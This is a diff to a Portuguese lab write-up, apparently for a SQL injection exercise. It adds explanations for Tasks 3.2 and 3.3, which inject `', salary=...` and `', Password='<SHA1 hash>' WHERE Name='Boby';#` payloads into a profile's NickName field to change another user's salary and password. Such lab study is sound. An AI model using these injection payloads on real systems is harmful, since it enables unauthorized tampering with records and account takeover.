@@ -177,7 +177,7 @@ Pela figura em baixo podemos confirmar que o valor do salário foi realmente alt
 
 ### Task 3.2: Modify other people' salary
 
-Para esta tarefa, usou-se um raciocínio semelhante ao da tarefa anterior. Desta vez escreveu-se `', salary='1' WHERE Name='Boby';#` no campo `NickName` (e os outros campos ficaram vazios). Desta maneira, a _query_ SQL será alterada para a seguinte:
+Para esta tarefa, usou-se um raciocínio semelhante ao da tarefa anterior. Desta vez escreveu-se `', salary='1' WHERE Name='Boby';#` no campo `NickName` (e os outros campos ficaram vazios) na página de editar o perfil da Alice. Desta maneira, a _query_ SQL será alterada para a seguinte:
 
 ```sql
 UPDATE credential SET
@@ -212,13 +212,23 @@ mysql> SELECT * FROM credential;
 
 ### Task 3.3: Modify other people' password
 
-O SHA1 da string `1234` é `7110eda4d09e062aa5e4a390b0a572ac0d2c0220`
+Pretende-se alterar a password do Boby, por exemplo para `1234`. A diferença em relação à tarefa anterior é o atributo a ser modificado, neste caso é `Password`. Sendo assim, escreveu-se `', Password='7110eda4d09e062aa5e4a390b0a572ac0d2c0220' WHERE Name='Boby';#` no campo `NickName` (e os outros campos ficaram vazios) na página de editar o perfil da Alice. Desta maneira, a _query_ SQL será alterada para a seguinte:
 
-Com isto, alteramos o valor da password do Boby para o valor acima, pois o que é guardado na tabela `credential` é a hash das passwords e não o valor destas.
+```sql
+UPDATE credential SET
+  nickname='', Password='7110eda4d09e062aa5e4a390b0a572ac0d2c0220' WHERE Name='Boby';#',
+  email='',
+  address='',
+  Password='',
+  PhoneNumber=''
+WHERE ID=$id;
+``` 
 
-Assim, podemos confirmar que realmente foi alterado:
+Tal como é dito, "database stores the hash value of passwords instead of the plaintext password string. [...] It uses SHA1 hash function to generate the hash value of password". Como o resultado de `SHA1` da string `1234` é `7110eda4d09e062aa5e4a390b0a572ac0d2c0220`, foi usado `Password='7110eda4d09e062aa5e4a390b0a572ac0d2c0220'` em vez de `Password='1234'`.
 
-```
+Assim, podemos confirmar que a password foi alterada na tabela `credential` para `7110eda4d09e062aa5e4a390b0a572ac0d2c0220`:
+
+```sh
 mysql> SELECT * FROM credential;
 +----+-------+-------+--------+-------+----------+-------------+---------+-------+----------+------------------------------------------+
 | ID | Name  | EID   | Salary | birth | SSN      | PhoneNumber | Address | Email | NickName | Password                                 |
@@ -233,6 +243,6 @@ mysql> SELECT * FROM credential;
 6 rows in set (0.00 sec)
 ```
 
-Como seria de esperar, conseguimos fazer login com a nova password.
+Como seria de esperar, conseguimos fazer login com a nova password - `1234`.
 
 ![](./screenshots/profileboby.png)
